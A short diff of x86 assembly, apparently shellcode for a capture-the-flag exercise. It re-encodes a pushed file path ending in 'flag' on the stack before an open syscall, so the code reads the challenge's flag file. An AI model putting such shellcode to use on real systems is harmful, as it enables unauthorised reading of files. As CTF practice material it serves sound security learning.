@@ -6,9 +6,9 @@ _start:
 	push eax
 
 	push 0x67616c66         ;파일 경로
-	push 0x2f2f6d73
-	push 0x612f2f65
-	push 0x6d6f682f
+	push 0x2f6d7361
+	push 0x2f656d6f
+	push 0x682f2f2f
 	mov ecx, eax
 	mov ebx, esp
 	mov al, 0x5
